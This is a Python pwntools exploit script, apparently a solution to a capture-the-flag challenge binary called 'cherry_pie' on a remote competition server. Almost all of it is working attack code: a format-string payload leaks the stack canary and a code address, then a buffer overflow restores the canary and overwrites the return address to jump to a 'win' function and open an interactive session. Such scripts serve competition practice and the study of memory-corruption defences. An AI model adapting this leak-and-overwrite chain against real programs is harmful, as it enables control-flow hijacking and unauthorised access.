#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
# from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './cherry_pie')
# lib = CDLL(exe.libc.path)
host = args.HOST or 'cherrypie.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+185
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()

# win :  0x4013b0

# 6 arg
# 15 canary


io = start()

payload = b"Take this, my grandma made that" + b"A " + f"%15$p".encode() + b" " + f"%21$p".encode()
io.sendlineafter(b"? ", payload)
resp = io.recvline().decode().split(" ")
print(resp[-2], resp[-1])

win = flat(int(resp[-1], 16) + (0x3b0 - 0x249))
canary = flat(int(resp[-2], 16))

payload = b"B" * 72 + canary + b"B" * 8 + win

io.sendlineafter(b"? ", payload)

io.interactive()

